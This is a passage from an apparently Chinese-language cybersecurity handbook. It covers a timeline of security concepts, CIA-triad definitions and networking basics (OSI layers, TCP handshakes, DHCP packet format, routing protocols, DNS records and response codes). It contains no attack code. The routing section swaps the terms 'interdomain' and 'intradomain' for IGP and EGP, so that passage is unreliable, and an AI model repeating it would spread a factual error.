<p>随着时代不断的发展，攻防技术有了很大的改变，防御手段、安全意识也随着演化。在攻击发生前有威胁情报、黑名单共享等机制，威胁及时能传播。在攻击发生时有基于各种机制的防火墙如关键字检测、语义分析、深度学习，有的防御机制甚至能一定程度上防御零日攻击。在攻击发生后，一些关键系统系统做了隔离，攻击成果难以扩大，就算拿到了目标也很难做进一步的攻击。也有的目标蜜罐仿真程度很高，有正常的服务和一些难以判断真假的业务数据。</p>
<p>2010年6月，震网 (Stuxnet) 被发现，在这之后供应链攻击事件开始成为网络空间安全的新兴威胁之一。随后的XcodeGhost、CCleaner等供应链攻击事件都造成了重大影响。</p>
<p>在2010年Forrester Research Inc.的分析师提出了“零信任”的概念模型时。</p>
<p>2012年1月，Gartner 公司提出了 IAST (Interactive Application Security Testing) 的概念，提供了结合 DAST 和 SAST 两种技术的解决方案。</p>
<p>2012年9月，Gartner 公司研究员 David Cearley 提出了 DevSecOps 的概念，表示 DevOps 的流程应该包含安全理念。</p>
<p>2013年，MITRE 提出了 ATT&amp;CK™ (Adversarial Tactics, Techniques, and Common Knowledge, ATT&amp;CK) ，这是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。</p>
<p>2013年，Michigan 大学开始了 ZMap 项目，在2015年这个项目演化为 Censys ，从这之后网络空间测绘的项目逐渐出现。</p>
<p>2014年，在 Gartner Security and Risk Management Summit 上，Runtime Application Self-protection (RASP) 的概念被提出，在应用层进行安全保护。</p>
<p>2015年，Gartner 首次提出了 SOAR 的概念，最初的定义是 Security Operations, Analytics and Reporting，即安全运维分析与报告。</p>
<p>2017年，Gartner 对 SOAR 概念做了重新定义：Security Orchestration, Automation and Response, 即安全编排、自动化与响应。</p>
</div>
<div class="section" id="id5">
<h4>参考链接<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/OWASP">OWASP</a></li>
<li><a class="reference external" href="http://www.phrack.com/issues.html?issue=54&amp;id=8">NT Web Technology Vulnerabilities</a></li>
<li><a class="reference external" href="https://cve.mitre.org/about/history.html">History of CVE</a></li>
<li><a class="reference external" href="https://documents.pub/document/history-of-some-vulnerabilities-and-exploit-techniques.html">history of some vulnerabilities and exploit techniques</a></li>
<li><a class="reference external" href="http://securitydigest.org/">securitydigest</a></li>
<li><a class="reference external" href="http://seclab.cs.ucdavis.edu/projects/history/CD/">Early Computer Security Papers: Ongoing Collection</a></li>
<li><a class="reference external" href="https://seclists.org/">Security Mailing List Archive</a></li>
<li><a class="reference external" href="https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf">Computer Security Technology Planning Study</a></li>
<li><a class="reference external" href="https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf">Smashing The Stack For Fun And Profit</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/en-us/archive/blogs/dross/happy-10th-birthday-cross-site-scripting">Happy 10th birthday Cross-Site Scripting!</a></li>
<li><a class="reference external" href="https://www.microsoft.com/en-us/securityengineering/sdl/about">About Microsoft SDL</a></li>
<li><a class="reference external" href="https://www.zerodayinitiative.com/about/">ABOUT ZDI</a></li>
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Open-source_intelligence">Open-source intelligence</a></li>
<li><a class="reference external" href="https://www.gartner.com/en/information-technology/glossary/runtime-application-self-protection-rasp">Runtime Application Self-protection (RASP)</a></li>
<li><a class="reference external" href="https://zmap.io/paper.pdf">ZMap: Fast Internet-Wide Scanning and its Security Applications</a></li>
<li><a class="reference external" href="https://censys.io/static/censys.pdf">A Search Engine Backed by Internet-Wide Scanning</a></li>
<li><a class="reference external" href="https://www.blackhat.com/about.html">Black hat About</a></li>
<li><a class="reference external" href="https://www.defcon.org/html/links/dc-about.html">The DEF CON Story</a></li>
<li><a class="reference external" href="https://users.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Reflections on Trusting Trust</a></li>
<li><a class="reference external" href="https://www.devsecops.org/blog/2015/2/15/what-is-devsecops">What is DevSecOps?</a></li>
</ul>
</div>
</div>
<span id="document-basic/outlook"></span><div class="section" id="id1">
<h3>网络安全观<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>网络安全定义<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。</p>
<p>网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。</p>
<p>网络安全的基本需求包括可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性等。其中三个最基本的要素是机密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability)。</p>
<p>机密性是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。</p>
<p>完整性是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。</p>
<p>可用性指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。</p>
<p>网络安全的主体是保护网络上的数据和通信的安全，数据安全性是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等，通信安全性是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施。</p>
</div>
<div class="section" id="id3">
<h4>系统脆弱性<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>信息系统本身是脆弱的，信息系统的硬件资源、通信资源、软件及信息资源等都可能因为可预见或不可预见甚至恶意的原因而可能导致系统受到破坏、更改、泄露和功能失效，从而使系统处于异常状态，甚至崩溃瘫痪。</p>
<p>硬件资源的脆弱性主要表现为物理安全方面的问题，多源于设计，采用软件程序的方法见效不大。</p>
<p>软件的脆弱性来源于设计和软件工程实施中遗留问题，如设计中的疏忽、内部设计的逻辑混乱，没有遵守信息系统安全原则进行设计等。</p>
</div>
</div>
</div>
</div>
<span id="document-network/index"></span><div class="section" id="id1">
<h2>计算机网络与协议<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-network/basic"></span><div class="section" id="id1">
<h3>网络基础<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>计算机通信网的组成<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>计算机网络由通信子网和资源子网组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。</p>
<p>其中资源子网是计算机通信的本地系统环境，包括主机、终端和应用程序等， 资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载 均衡等。</p>
<p>总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。</p>
</div>
<div class="section" id="id3">
<h4>通信协议<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。</p>
<p>协议涉及到三个要素，分别为：</p>
<ul class="simple">
<li>语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义</li>
<li>语义：用于解释比特流的每一部分的意义</li>
<li>时序：事件实现顺序的详细说明</li>
</ul>
</div>
<div class="section" id="osi">
<h4>OSI七层模型<a class="headerlink" href="#osi" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>简介<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>OSI（Open System Interconnection）共分为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层，其具体的功能如下。</p>
</div>
<div class="section" id="id5">
<h5>物理层<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性</li>
<li>通过传输介质进行数据流(比特流)的物理传输、故障监测和物理层管理</li>
<li>从数据链路层接收帧，将比特流转换成底层物理介质上的信号</li>
</ul>
</div>
<div class="section" id="id6">
<h5>数据链路层<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>在物理链路的两端之间传输数据</li>
<li>在网络层实体间提供数据传输功能和控制</li>
<li>提供数据的流量控制</li>
<li>检测和纠正物理链路产生的差错</li>
<li>格式化的消息称为帧</li>
</ul>
</div>
<div class="section" id="id7">
<h5>网络层<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>负责端到端的数据的路由或交换，为透明地传输数据建立连接</li>
<li>寻址并解决与数据在异构网络间传输相关的所有问题</li>
<li>使用上面的传输层和下面的数据链路层的功能</li>
<li>格式化的消息称为分组</li>
</ul>
</div>
<div class="section" id="id8">
<h5>传输层<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>提供无差错的数据传输</li>
<li>接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地</li>
<li>在系统之间提供可靠的透明的数据传输,提供端到端的错误恢复和流量控制</li>
</ul>
</div>
<div class="section" id="id9">
<h5>会话层<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>提供节点之间通信过程的协调</li>
<li>负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接</li>
<li>使用上面的表示层和下面的传输层的功能</li>
</ul>
</div>
<div class="section" id="id10">
<h5>表示层<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>提供数据格式、变换和编码转换</li>
<li>涉及正在传输数据的语法和语义</li>
<li>将消息以合适电子传输的格式编码</li>
<li>执行该层的数据压缩和加密</li>
<li>从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中</li>
</ul>
</div>
<div class="section" id="id11">
<h5>应用层<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等</li>
</ul>
</div>
<div class="section" id="id12">
<h5>总结<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（ hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由网络层来控制各条链路上的通信，但要依赖于其他节点的协调操作。</p>
<p>高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。</p>
<p>传输层是高三层和低三层之间的接口，它是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。</p>
</div>
</div>
</div>
<span id="document-network/udp"></span><div class="section" id="udp">
<h3>UDP协议<a class="headerlink" href="#udp" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>主要特点<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>协议开销小、效率高。</li>
<li>UDP是无连接的，即发送数据之前不需要建立连接。</li>
<li>UDP使用尽最大努力交付，即不保证可靠交付。</li>
<li>UDP没有拥塞控制。</li>
<li>UDP支持一对一、一对多、多对一和多对多交互通信。</li>
<li>UDP的首部开销小，只有8个字节。</li>
</ul>
</div>
</div>
<span id="document-network/tcp"></span><div class="section" id="tcp">
<h3>TCP协议<a class="headerlink" href="#tcp" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由RFC 793定义。</p>
</div>
<div class="section" id="id2">
<h4>TCP状态<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p><img alt="statetransition" src="images/tcp-state-transition-diagram.gif" /></p>
<div class="section" id="id3">
<h5>三次握手<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>三次握手（Three-Way Handshake）是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。</p>
<p>第一次握手客户端将标志位 SYN 置为1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。</p>
<p>第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK 都置为1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。</p>
<p>第三次握手客户端收到确认后，检查ack值是否为s+1，ACK标志位是否为1，如果正确则将标志位 ACK 置为1，ack=k+1，并将该数据包发送给服务端，服务端检查ack值是否为k+1，ACK标志位是否为1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。</p>
</div>
<div class="section" id="id4">
<h5>四次挥手<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>四次挥手（Four-Way Wavehand）指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。</p>
<p>第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。</p>
<p>第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号+1，服务端进入 CLOSE_WAIT 状态。</p>
<p>第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。</p>
<p>第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号+1，服务端进入 CLOSED 状态，完成四次挥手。</p>
</div>
</div>
<div class="section" id="id5">
<h4>拥塞控制<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。</p>
<p>TCP采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP的拥塞算法有过多种实现，包括Tahoe、Reno、NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR等。</p>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc793">RFC 793 TRANSMISSION CONTROL PROTOCOL</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2001">RFC 2001 TCP Slow Start, Congestion Avoidance, Fast Retransmit, and Fast Recovery Algorithms</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3390">RFC 3390 Increasing TCP's Initial Window</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5681">RFC 5681 TCP Congestion Control</a></li>
<li><a class="reference external" href="https://en.wikipedia.org/wiki/TCP_congestion_control">TCP congestion control wiki</a></li>
</ul>
</div>
</div>
<span id="document-network/dhcp"></span><div class="section" id="dhcp">
<h3>DHCP协议<a class="headerlink" href="#dhcp" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。</p>
<p>DHCP服务器端使用67/udp，客户端使用68/udp。DHCP运行分为四个基本过程，分别为请求IP租约、提供IP租约、选择IP租约和确认IP租约。客户端在获得了一个IP地址以后，就可以发送一个ARP请求来避免由于DHCP服务器地址池重叠而引发的IP冲突。</p>
</div>
<div class="section" id="dchp">
<h4>DCHP 报文格式<a class="headerlink" href="#dchp" title="永久链接至标题">¶</a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">0</span> <span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span> <span class="mi">4</span> <span class="mi">5</span> <span class="mi">6</span> <span class="mi">7</span> <span class="mi">8</span> <span class="mi">9</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span> <span class="mi">4</span> <span class="mi">5</span> <span class="mi">6</span> <span class="mi">7</span> <span class="mi">8</span> <span class="mi">9</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span> <span class="mi">4</span> <span class="mi">5</span> <span class="mi">6</span> <span class="mi">7</span> <span class="mi">8</span> <span class="mi">9</span> <span class="mi">0</span> <span class="mi">1</span>
<span class="o">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
<span class="o">|</span>     <span class="n">op</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="o">|</span>   <span class="n">htype</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>   <span class="o">|</span>   <span class="n">hlen</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="o">|</span>   <span class="n">hops</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="o">|</span>
<span class="o">+---------------+---------------+---------------+---------------+</span>
<span class="o">|</span>                            <span class="n">xid</span> <span class="p">(</span><span class="mi">4</span><span class="p">)</span>                            <span class="o">|</span>
<span class="o">+-------------------------------+-------------------------------+</span>
<span class="o">|</span>           <span class="n">secs</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>            <span class="o">|</span>           <span class="n">flags</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>           <span class="o">|</span>
<span class="o">+-------------------------------+-------------------------------+</span>
<span class="o">|</span>                          <span class="n">ciaddr</span>  <span class="p">(</span><span class="mi">4</span><span class="p">)</span>                          <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">yiaddr</span>  <span class="p">(</span><span class="mi">4</span><span class="p">)</span>                          <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">siaddr</span>  <span class="p">(</span><span class="mi">4</span><span class="p">)</span>                          <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">giaddr</span>  <span class="p">(</span><span class="mi">4</span><span class="p">)</span>                          <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">chaddr</span>  <span class="p">(</span><span class="mi">16</span><span class="p">)</span>                         <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">sname</span>   <span class="p">(</span><span class="mi">64</span><span class="p">)</span>                         <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">file</span>    <span class="p">(</span><span class="mi">128</span><span class="p">)</span>                        <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
<span class="o">|</span>                          <span class="n">options</span> <span class="p">(</span><span class="n">variable</span><span class="p">)</span>                   <span class="o">|</span>
<span class="o">+---------------------------------------------------------------+</span>
</pre></div>
</div>
</div>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP Wiki</a></li>
</ul>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2131">RFC 2131 Dynamic Host Configuration Protocol</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2132">RFC 2132 DHCP Options and BOOTP Vendor Extensions</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3046">RFC 3046 DHCP Relay Agent Information Option</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3397">RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3442">RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3942">RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4242">RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4361">RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four (DHCPv4)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4436">RFC 4436 Detecting Network Attachment in IPv4 (DNAv4)</a></li>
</ul>
</div>
</div>
</div>
<span id="document-network/route"></span><div class="section" id="id1">
<h3>路由算法<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。</p>
</div>
<div class="section" id="id3">
<h4>路由选择算法的功能<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。</p>
<p>路由选择算法的要求：</p>
<ul class="simple">
<li>正确性：确保分组从源节点传送到目的节点</li>
<li>简单性：实现方便，软硬件开销小</li>
<li>自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化</li>
<li>稳定性：能长时间无故障运行</li>
<li>公平性：每个节点都有机会传送信息</li>
<li>最优性：尽量选取好的路由</li>
</ul>
</div>
<div class="section" id="as-autonomous-system">
<h4>自治系统 AS (Autonomous System)<a class="headerlink" href="#as-autonomous-system" title="永久链接至标题">¶</a></h4>
<p>经典定义：</p>
<ul class="simple">
<li>由一个组织管理的一整套路由器和网络。</li>
<li>使用一种AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。</li>
<li>使用一种 AS 之间的路由选择协议用以确定分组在AS之间的路由。</li>
</ul>
<p>尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。</p>
</div>
<div class="section" id="id4">
<h4>两大类路由选择协议<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol)和外部网关协议 EGP (External Gateway Protocol)。</p>
<p>IGP是在一个AS内部使用的路由选择协议，如RIP和OSPF协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的AS中，在数据报到达AS的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如BGP-4，是域间路由选择 (intradomain routing)。</p>
</div>
<div class="section" id="rip">
<h4>RIP<a class="headerlink" href="#rip" title="永久链接至标题">¶</a></h4>
<p>路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。</p>
</div>
<div class="section" id="ospf">
<h4>OSPF<a class="headerlink" href="#ospf" title="永久链接至标题">¶</a></h4>
<p>开放最短路径优先(Open Shortest Path First，OSPF)，这个算法名为“最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。</p>
</div>
</div>
<span id="document-network/domain"></span><div class="section" id="id1">
<h3>域名系统<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>DNS是一个简单的请求-响应协议，是将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP协议的53端口。</p>
</div>
<div class="section" id="id3">
<h4>术语<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="mdns">
<h5>mDNS<a class="headerlink" href="#mdns" title="永久链接至标题">¶</a></h5>
<p>Multicast DNS (mDNS)，多播DNS，使用5353端口，组播地址为 <code class="docutils literal notranslate"><span class="pre">224.0.0.251</span></code> 或 <code class="docutils literal notranslate"><span class="pre">[FF02::FB]</span></code> 。在一个没有常规DNS服务器的小型网络内可以使用mDNS来实现类似DNS的编程接口、包格式和操作语义。mDNS协议的报文与DNS的报文结构相同，但有些字段对于mDNS来说有新的含义。</p>
<p>启动mDNS的主机会在进入局域网后向所有主机组播消息，包含主机名、IP等信息，其他拥有相应服务的主机也会响应含有主机名和IP的信息。</p>
<p>mDNS的域名是用 <code class="docutils literal notranslate"><span class="pre">.local</span></code> 和普通域名区分开的。</p>
</div>
<div class="section" id="fqdn">
<h5>FQDN<a class="headerlink" href="#fqdn" title="永久链接至标题">¶</a></h5>
<p>FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如 <code class="docutils literal notranslate"><span class="pre">www.example.com.</span></code> 。</p>
</div>
<div class="section" id="tld">
<h5>TLD<a class="headerlink" href="#tld" title="永久链接至标题">¶</a></h5>
<p>Top-Level Domain (TLD) 是属于根域的一个域，例如 <code class="docutils literal notranslate"><span class="pre">com</span></code> 或 <code class="docutils literal notranslate"><span class="pre">jp</span></code> 。</p>
<p>TLD一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。</p>
</div>
<div class="section" id="idn">
<h5>IDN<a class="headerlink" href="#idn" title="永久链接至标题">¶</a></h5>
<p>Internationalized Domain Names for Applications (IDNA) 是为了处理非ASCII字符的情况。</p>
</div>
<div class="section" id="cname">
<h5>CNAME<a class="headerlink" href="#cname" title="永久链接至标题">¶</a></h5>
<p>CNAME即Canonical name，又称alias，将域名指向另一个域名。</p>
</div>
<div class="section" id="ttl">
<h5>TTL<a class="headerlink" href="#ttl" title="永久链接至标题">¶</a></h5>
<p>Time To Live，无符号整数，记录DNS记录过期的时间，最小是0，最大是2147483647 (2^31 - 1)。</p>
</div>
</div>
<div class="section" id="id4">
<h4>请求响应<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="dns">
<h5>DNS记录<a class="headerlink" href="#dns" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>A记录</dt>
<dd><ul class="first last">
<li>返回域名对应的IPv4地址</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>NS记录</dt>
<dd><ul class="first last">
<li>域名服务器</li>
<li>返回该域名由哪台域名服务器解析</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>PTR记录</dt>
<dd><ul class="first last">
<li>反向记录</li>
<li>从IP地址到域名的记录</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>MX记录</dt>
<dd><ul class="first last">
<li>电子邮件交换记录</li>
<li>记录邮件域名对应的IP地址</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h5>响应码<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>NOERROR</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">No</span> <span class="n">error</span> <span class="n">condition</span>
</pre></div>
</div>
<ul class="simple">
<li>FORMERR</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Format</span> <span class="n">error</span> <span class="o">-</span> <span class="n">The</span> <span class="n">name</span> <span class="n">server</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">interpret</span> <span class="n">the</span> <span class="n">query</span>
</pre></div>
</div>
<ul class="simple">
<li>SERVFAIL</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Server</span> <span class="n">failure</span> <span class="o">-</span> <span class="n">The</span> <span class="n">name</span> <span class="n">server</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">process</span> <span class="n">this</span> <span class="n">query</span> <span class="n">due</span> <span class="n">to</span> <span class="n">a</span> <span class="n">problem</span> <span class="k">with</span> <span class="n">the</span> <span class="n">name</span> <span class="n">server</span>
</pre></div>
</div>
<ul class="simple">
<li>NXDOMAIN</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">this</span> <span class="n">code</span> <span class="n">signifies</span> <span class="n">that</span> <span class="n">the</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">referenced</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">query</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span>
</pre></div>
</div>
<ul class="simple">
<li>NOTIMP</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Not</span> <span class="n">Implemented</span> <span class="o">-</span> <span class="n">The</span> <span class="n">name</span> <span class="n">server</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">support</span> <span class="n">the</span> <span class="n">requested</span> <span class="n">kind</span> <span class="n">of</span> <span class="n">query</span>
</pre></div>
</div>
<ul class="simple">
<li>REFUSED</li>
</ul>
